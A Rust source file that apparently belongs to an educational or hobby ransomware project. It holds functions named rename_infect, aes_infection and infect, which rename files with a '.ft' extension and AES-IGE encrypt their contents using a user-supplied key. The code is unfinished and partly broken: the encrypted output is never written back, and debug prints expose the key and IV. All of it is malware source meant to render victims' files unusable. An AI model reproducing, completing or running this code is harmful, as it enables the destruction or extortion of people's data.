use std::path::PathBuf;
use std::fs::rename;
use std::fs::File;
use std::io::Read;
use openssl::{aes, symm::Mode};
use rand::rngs::ThreadRng;
use rand::{Rng, thread_rng};
use crate::tools::Flags;

/* Does not work on different mountpoint, see rename doc */
pub fn rename_infect(path: &PathBuf) {
    if let Some(path) = path.to_str() {
        let path_ft = path.to_owned() + ".ft";
        let _ = rename(path, path_ft);
    }
}

fn aes_infection(list: &Flags, buf_in: &mut Vec<u8>) {
    let key_bytes: &[u8] = list.key.as_bytes();
    println!("key_bytes:{}", list.key);
    let mut buf_out: Vec<u8> = Vec::new();
    //128bits iv size?
    //let mut iv: Vec<u8> = Vec::new().reserve_exact(key_bytes.capacity());
    let mut iv: [u8; 16] = [0u8; 16].map(|_|thread_rng().gen_range(0..255));
    println!("{iv:?}");
    println!("cap:{}", buf_in.capacity());
    buf_in.reserve_exact(buf_in.capacity() + 16);
    println!("cap:{}", buf_in.capacity());
    buf_out.reserve_exact(buf_in.capacity());
    let key = aes::AesKey::new_encrypt(key_bytes).unwrap();
    aes::aes_ige(buf_in, &mut buf_out, &key, &mut iv, Mode::Encrypt);
}

pub fn infect(list: &Flags, path: &PathBuf) {
    let mut buf: Vec<u8> = Vec::new();
    if let Some(path_str) = path.to_str() {
     println!("soime:{}", path_str);
        if let Ok(mut file) = File::open(path_str) {
            if let Ok(count) = file.read_to_end(&mut buf) {
                aes_infection(list, &mut buf);
            } else {
                eprintln!("Couldn't read file.");
            }
        }
    }
    //get content file
    //change content
    //sync_data();
}
